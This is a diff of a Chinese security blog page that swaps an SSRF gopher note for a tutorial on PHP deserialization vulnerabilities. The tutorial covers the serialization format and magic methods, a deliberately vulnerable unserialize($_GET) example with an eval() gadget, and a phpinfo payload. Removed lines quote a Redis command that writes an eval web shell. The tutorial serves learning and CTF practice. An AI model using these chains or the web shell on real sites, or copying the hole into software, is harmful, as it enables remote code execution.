@@ -4,11 +4,16 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFHub中SSRF使用POST, Take Pains,Be Perfect.">
+    <meta name="keywords" content="PHP反序列化, Take Pains,Be Perfect.">
     <meta name="baidu-site-verification" content="fmlEuI34ir" />
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48" />
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7" />
-    <meta name="description" content="审计flag.php这里有一个点是$_SERVER[&#34;REMOTE_ADDR&#34;]是“可靠”的请求端ip地址，是服务端在进行TCP握手时获得的，从技术上来说是几乎不可能伪造的，与$_SERVER[&#34;HTTP_X_FORWARDED_FOR&#34;]">
+    <meta name="description" content="PHP反序列化0x01什么是序列化和反序列化PHP的序列化php的序列化是一个将各种类型的数据压缩并按照一定格式存储的过程，它所使用的函数是serialize()。
+实例：
+name=$name;
+        }
+
+        pu">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +21,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>CTFHub中SSRF使用POST | Rollinon的博客</title>
+    <title>PHP反序列化 | Rollinon的博客</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -242,13 +247,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        CTFHub中SSRF使用POST
+                        PHP反序列化
                     </div>
                 </div>
             </div>
@@ -359,12 +364,8 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/SSRF/" target="_blank">
-                            <span class="chip bg-color">SSRF</span>
-                        </a>
-                        
-                        <a href="/tags/CTF/" target="_blank">
-                            <span class="chip bg-color">CTF</span>
+                        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">
+                            <span class="chip bg-color">反序列化</span>
                         </a>
                         
                     </div>
@@ -375,12 +376,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/SSRF/" class="post-category" target="_blank">
-                            SSRF
-                        </a>
-                        
-                        <a href="/categories/SSRF/CTF/" class="post-category" target="_blank">
-                            CTF
+                        <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category" target="_blank">
+                            反序列化
                         </a>
                         
                     </div>
@@ -391,7 +388,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-10
+                    2021-09-19
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -405,14 +402,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    180
+                    2.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    8 分
                 </div>
                 
                 
@@ -423,16 +420,255 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="审计flag-php"><a href="#审计flag-php" class="headerlink" title="审计flag.php"></a>审计flag.php</h2><p>这里有一个点是<code>$_SERVER["REMOTE_ADDR"]</code>是“可靠”的请求端ip地址，是服务端在进行TCP握手时获得的，从技术上来说是几乎不可能伪造的，与<code>$_SERVER["HTTP_X_FORWARDED_FOR"]</code>和<code>$_SERVER["HTTP_CLIENT_IP"]</code>这两个可以通过修改http报头轻松伪造的参数不同。</p>
-<p><strong>记得gopher的默认端口是70，如果要发送请求到其它端口，记得修改</strong></p>
-<p>简化一下流程：</p>
-<pre><code>1.侦测注入点
-2.找到攻击对象，如“flag.php”
-3.构造gopher数据（最常见的就是通过本地请求，本地抓包，然后手动或者脚本构造）
-4.进行攻击</code></pre><blockquote>
-<p>参考</p>
-<p><a href="https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/" target="_blank" rel="noopener">https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/</a></p>
-</blockquote>
+                <h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="0x01什么是序列化和反序列化"><a href="#0x01什么是序列化和反序列化" class="headerlink" title="0x01什么是序列化和反序列化"></a>0x01什么是序列化和反序列化</h2><h3 id="PHP的序列化"><a href="#PHP的序列化" class="headerlink" title="PHP的序列化"></a>PHP的序列化</h3><p>php的序列化是一个将各种类型的数据压缩并按照一定格式存储的过程，它所使用的函数是serialize()。</p>
+<p>实例：</p>
+<pre class="line-numbers language-PHP"><code class="language-PHP"><?php   
+    class Person{
+
+        private $name='test';
+        protected $gender='male';
+        public $age=18;
+
+        public function set_name($name){
+            $this->name=$name;
+        }
+
+        public function get_name(){
+            return $this->name;
+        }
+    }
+    $user=new Person();
+    $user->set_name('Rollinon');
+    $data=serialize($user);
+    echo $data;
+?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>输出：</p>
+<p><img src="https://gitee.com/h1ler/blogimage/raw/master/img/image.png" alt=""></p>
+<p>依次解释如下：</p>
+<p><code>O</code>代表Object对象；</p>
+<p><code>6</code>代表类名长度是6</p>
+<p><code>Person</code>代表类名；</p>
+<p><code>3</code>代表类中的属性有3个；</p>
+<p><code>s:12:"&lt;0x00&gt;Person&lt;0x00&gt;name";s:8:"Rollinon";&lt;0x00&gt;</code>无法显示，其中<code>s</code>代表String类型，<code>12</code>代表属性名<code>&lt;0x00&gt;Person&lt;0x00&gt;name</code>的长度，<code>&lt;0x00&gt;</code>会占一个长度，<code>s</code>代表String类型，<code>8</code>代表属性值的长度，<code>Rollinon</code>是属性值；</p>
+<p><code>s:9:"&lt;0x00&gt;*&lt;0x00&gt;gender";s:4:"male";</code>其中<code>s</code>代表String类型，<code>9</code>代表属性名<code>&lt;0x00&gt;*&lt;0x00&gt;gender</code>的长度，<code>s</code>代表String类型，<code>4</code>代表属性值的长度，<code>male</code>是属性值；</p>
+<p><code>s:3:"age";i:18;</code>其中<code>s</code>代表String类型，<code>3</code>代表属性名<code>age</code>的长度，<code>i</code>代表integer类型，<code>17</code>是属性值</p>
+<p><strong>注意</strong> :</p>
+<ol>
+<li>不同类型类属性</li>
+</ol>
+<p>    private属性序列化的格式：%00类名%00属性名<br>    protected属性序列化的格式：%00*%00属性名</p>
+<ol start="2">
+<li>序列化只序列化类属性，不序列化类方法</li>
+</ol>
+<p>因此在利用反序列化漏洞的时候：</p>
+<ol>
+<li><p>一定要保证在当前的作用域环境下有该类存在</p>
+</li>
+<li><p>攻击的时候也就是依托类属性进行攻击</p>
+</li>
+</ol>
+<h3 id="PHP的反序列化"><a href="#PHP的反序列化" class="headerlink" title="PHP的反序列化"></a>PHP的反序列化</h3><p>有序列化对象为压缩格式化的字符串，就有反序列化将压缩格式化的字符串还原，依旧沿用以上代码，先将序列化的内容放在<code>serialize.txt</code>中，然后进行反序列化，并输出属性值<code>name</code>和<code>age</code>的值:</p>
+<pre class="line-numbers language-PHP"><code class="language-PHP"><?php   
+    class Person{
+
+        private $name='test';
+        protected $gender='male';
+        public $age=18;
+
+        public function set_name($name){
+            $this->name=$name;
+        }
+
+        public function get_name(){
+            return $this->name;
+        }
+    }
+    $user=new Person();
+    $user->set_name('Rollinon');
+    $data=serialize($user);
+//    echo $data;
+    $data=unserialize($data);
+    echo $data->age;
+    echo $data->get_name();
+?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>输出：</p>
+<pre class="line-numbers language-PHP"><code class="language-PHP">18Rollinon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>那么如果$data参数是用户可控的呢？例如传入如下参数：</p>
+<pre class="line-numbers language-Bash"><code class="language-Bash">O:6:"Person":3:{s:12:" Person name";s:6:"Hacker";s:9:" * gender";s:6:"female";s:3:"age";i:17;}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>人为的改变了类属性的值，由此引出PHP反序列化漏洞。</p>
+<h2 id="0x02-PHP反序列化漏洞"><a href="#0x02-PHP反序列化漏洞" class="headerlink" title="0x02 PHP反序列化漏洞"></a>0x02 PHP反序列化漏洞</h2><p>反序列化漏洞的成因在于代码中的unserialize()接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现攻击。</p>
+<h3 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h3><p>PHP将所有以<code>__</code>（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以<code>__</code>为前缀。常见魔术方法：</p>
+<pre class="line-numbers language-PHP"><code class="language-PHP">__construct()  类的构造函数
+__destruct()   类的虚构函数
+__call()     在对象中调用一个不可访问方法时调用
+__callStatic() 用静态方式调用一个不可访问方法时调用
+__get()        获得一个类的成员变量时调用
+__set()        设置一个类的成员变量时调用
+__isset()      当对不可访问属性调用isset()或empty()时调用
+__unset()      当对不可访问属性调用unset()时被调用
+__sleep()      执行serialize()时，会先调用这个函数
+__wakeup()     执行unserialize()时，会先调用这个函数
+__toString()   类被当作字符串处理时的回应方法
+__invoke()     调用函数的方法调用一个对象时的回应方法
+__set_state()  调用var_export()导出类时，此静态方法会被调用
+__clone()      当对象复制完成时调用
+__autoload()   尝试加载未定义类
+__debugInfo()  打印所需调试信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol>
+<li><p><code>__construct()</code>：当对象创建时会自动调用（但在unserialize()时是不会自动调用的）</p>
+</li>
+<li><p><code>__wakeup()</code>：unserialize()时会自动调用</p>
+</li>
+<li><p><code>__destruct()</code>：当对象销毁时会自动调用</p>
+</li>
+<li><p><code>__toString()</code>：当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</p>
+</li>
+<li><p><code>__get()</code>：当从不可访问的属性读取数据</p>
+</li>
+<li><p><code>__call()</code>：在对象上下文中调用不可访问的方法时触发</p>
+</li>
+</ol>
+<p>实例：</p>
+<pre class="line-numbers language-PHP"><code class="language-PHP"><?php
+    Class User{
+
+        public $name="Bob";
+        private $id="777";
+
+        function __construct($name){
+            $this->name=$name;
+            echo "this is __construct"."\n";
+        }
+        function __destruct(){
+            echo "this is __destruct"."\n";
+        }
+        function __invoke(){
+            echo "this is __invoke"."\n";
+        }
+        function __toString(){
+            return "this is __toString"."\n";
+        }
+        function __wakeup(){
+            echo "this is __wakeup"."\n";
+        }
+        function __sleep(){
+            echo "this is __sleep"."\n";
+            return array("name","id");
+        }
+        function __call($name,$args){
+            echo "this is __call. name is ".$name." args is ".$args."</br>";
+        }
+        function __get($arg){
+            echo "call __get"."\n";
+        }
+        function __set($name,$id){
+            echo "call __set"."\n";
+        }
+    }
+
+    $r=new User("Rollinon");
+    $r();
+    echo $r;
+    unserialize(serialize($r));
+    $r->print("a");
+    $r->id;
+    $r->id=1;
+?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>输出：</p>
+<pre class="line-numbers language-纯文本"><code class="language-纯文本">this is __construct
+this is __invoke
+this is __toString
+this is __sleep
+this is __wakeup
+this is __destruct
+this is __call. name is print args is Array
+call __get
+call __set
+this is __destruct
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>__toString()触发方式比较多：</p>
+<ol>
+<li><p><code>echo($obj)/print($obj)</code>打印时会触发</p>
+</li>
+<li><p>反序列化对象与字符串连接时</p>
+</li>
+<li><p>反序列化对象参与格式化字符串时</p>
+</li>
+<li><p>反序列化对象与字符串进行比较时（PHP进行比较的时候会转换参数类型）</p>
+</li>
+<li><p>反序列化对象参与格式化SQL语句，绑定参数时</p>
+</li>
+<li><p>反序列化对象在经过PHP字符串函数，如<code>strlen()</code>、<code>addslashes()</code>时</p>
+</li>
+<li><p>在<code>in_array()</code>方法中，第一个参数是反序列化对象，第二个参数的数组中有<code>toString</code>返回的字符串的时候，<code>toString</code>会被调用</p>
+</li>
+<li><p>反序列化的对象作为class_exists()参数的时候</p>
+</li>
+</ol>
+<h3 id="魔法方法的作用"><a href="#魔法方法的作用" class="headerlink" title="魔法方法的作用"></a>魔法方法的作用</h3><p>在攻击中，反序列化函数unserialize()作为攻击的入口，即只要这个参数可控，就能传入任何已序列化的对象（只要这个类在当前作用于存在，我们就可以利用），而不是局限在出现unserialize()函数的类的对象，如果只能局限于当前类，则攻击面就太狭小了，这个类不调用危险方法就很难发起攻击。</p>
+<p>但我们在反序列化其他类对象之后，仅仅是控制了属性，并没有在完成反序列化后的代码中调用其它类对象的方法，此时就需要魔法方法发挥作用。</p>
+<p>魔法方法的调用是在该类序列化或反序列化的同时自动完成的，不需要人工干预，因此只要魔法方法中出现一些我们能利用的函数，就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到发动攻击的目的。</p>
+<h3 id="魔法方法的简单利用"><a href="#魔法方法的简单利用" class="headerlink" title="魔法方法的简单利用"></a>魔法方法的简单利用</h3><pre class="line-numbers language-PHP"><code class="language-PHP"><?php
+    class demo{
+
+        private $test;
+        public $name="i am Rollinon";
+
+        function __construct(){
+            $this->test=new L();
+        }
+
+        function __destruct()
+        {
+            $this->test->action();
+        }
+    }
+
+    class L{
+        function action(){
+            echo "function action() in class L";
+        }
+    }
+
+    class Evil{
+        var $test2;
+        function action(){
+            eval($this->test2);
+        }
+    }
+
+    unserialize($_GET['test']);
+?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>以上<code>unserialize()</code>函数的参数是可控的，也就是说能通过这个接口反序列化任何类 的对象（但只有在当前作用域的类才对我们有用），查看当前这三个类，能看到后面两个类反序列化以后对我们没有任何意义，因为其中的方法无法被我们调用。但第一个类中的魔法函数<code>__destruct()</code>，在对象销毁时自动调用。</p>
+<p>可以看到<code>__destruct()</code>里面只用到一个属性<code>test</code>，再看看哪些地方调用了<code>action()</code>函数，看看这个函数的调用中是否存在命令执行或者其他可利用点。果然再<code>Evil</code>这个类中发现它的<code>action()</code>调用了<code>eval()</code>函数。那么只需将demo这个类中的<code>test</code>属性篡改为<code>Evil</code>这个类的对象，然后将<code>Evil</code>对象的<code>test2</code>属性更改为执行的命令。</p>
+<pre class="line-numbers language-PHP"><code class="language-PHP"><?php
+    class demo{
+        private $test;
+        function __construct()
+        {
+            $this->test=new Evil();
+        }
+    }
+    class Evil{
+        var $test2="phpinfo();";
+    }
+    $demo=new demo();
+    $data=serialize($demo);
+    file_put_contents("serialize.txt",$data);
+?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Payload：</p>
+<pre class="line-numbers language-PHP"><code class="language-PHP">?test=O:4:"demo":1:{s:10:"%00demo%00test";O:4:"Evil":1:{s:5:"test2";s:10:"phpinfo();";}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>通过这个例子我们总结一下寻找PHP反序列化漏洞的方法或者流程</strong> </p>
+<ol>
+<li><p>寻找<code>unserialize()</code>函数的参数是否可控；</p>
+</li>
+<li><p>寻找反序列化的目标，重点寻找<code>wakeup()</code>或<code>destruct()</code>魔法函数的类；</p>
+</li>
+<li><p>一层一层研究该类在魔法方法中使用的属性和属性调用的方法，查看是否有可控的属性能实现在当前调用过程中触发；</p>
+</li>
+<li><p>找到可控的属性后将部分代码复制下来，构造序列化，发起攻击。</p>
+</li>
+</ol>
 
             </div>
             <hr />
@@ -471,7 +707,7 @@
         repo: 'Rollinon/rollinon.github.io',
         owner: 'Rollinon',
         admin: "Rollinon",
-        id: '2021/09/10/ctfhub-zhong-ssrf-shi-yong-post/',
+        id: '2021/09/19/php-fan-xu-lie-hua/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -492,63 +728,53 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/09/10/ctfhub-zhong-ssrf-da-redis/">
+                <a href="/2021/09/19/php-fan-xu-lie-hua/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="CTFHub中SSRF打Redis">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="PHP反序列化">
                         
-                        <span class="card-title">CTFHub中SSRF打Redis</span>
+                        <span class="card-title">PHP反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
-Redis相关协议
-Redis配置详解
-浅析Redis中SSRF的利用
+                            PHP反序列化0x01什么是序列化和反序列化PHP的序列化php的序列化是一个将各种类型的数据压缩并按照一定格式存储的过程，它所使用的函数是serialize()。
+实例：
+name=$name;
+        }
 
-这题进行写文件后执行命令。
-Redis命令如下：
-flushall
-set 1 '&lt;?php eval($_GET["cmd"]);?>'
-config se
+        pu
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-09-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-09-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/SSRF/" class="post-category" target="_blank">
-                                    SSRF
-                                </a>
-                            
-                            <a href="/categories/SSRF/CTF/" class="post-category" target="_blank">
-                                    CTF
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category" target="_blank">
+                                    反序列化
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SSRF/" target="_blank">
-                        <span class="chip bg-color">SSRF</span>
-                    </a>
-                    
-                    <a href="/tags/CTF/" target="_blank">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">
+                        <span class="chip bg-color">反序列化</span>
                     </a>
                     
                 </div>
@@ -562,36 +788,51 @@ config se
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/10/bypass-disable-function/">
+                <a href="/2021/09/18/ctfshow-web259/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="LD_PRELOAD">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="CTFShow_web259">
                         
-                        <span class="card-title">LD_PRELOAD</span>
+                        <span class="card-title">CTFShow_web259</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            LD_PRELOAD目的
-通过LD_PRELOAD方法绕过disabled_functions限制
+                            CTFShow_web259知识点
+CRLF
+SoapClient
+SSRF
+反序列化
 
-思路绕过disabled_functions的四种手法
-
-攻击后端组件，寻找存在命令注入的web应用常用后端组件，如ImageMagick
+这道题学习SoapClient与CRLF组合拳
+咱先学习学习啥是CRLF
+一般遇到反序列化题目，而本身那个php页面没用任何已有的类，那么大概率就是考
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-09-10
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-09-18
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/LD-PRELOAD/" class="post-category" target="_blank">
-                                    LD_PRELOAD
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category" target="_blank">
+                                    反序列化
+                                </a>
+                            
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/SSRF/" class="post-category" target="_blank">
+                                    SSRF
+                                </a>
+                            
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/SSRF/SoapClient/" class="post-category" target="_blank">
+                                    SoapClient
+                                </a>
+                            
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/SSRF/SoapClient/CRLF/" class="post-category" target="_blank">
+                                    CRLF
                                 </a>
                             
                             
@@ -601,12 +842,20 @@ config se
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/LD-PRELOA/" target="_blank">
-                        <span class="chip bg-color">LD_PRELOA</span>
+                    <a href="/tags/SSRF/" target="_blank">
+                        <span class="chip bg-color">SSRF</span>
                     </a>
                     
-                    <a href="/tags/Bypass-disable-function/" target="_blank">
-                        <span class="chip bg-color">Bypass_disable_function</span>
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">
+                        <span class="chip bg-color">反序列化</span>
+                    </a>
+                    
+                    <a href="/tags/SoapClient/" target="_blank">
+                        <span class="chip bg-color">SoapClient</span>
+                    </a>
+                    
+                    <a href="/tags/CRLF/" target="_blank">
+                        <span class="chip bg-color">CRLF</span>
                     </a>
                     
                 </div>
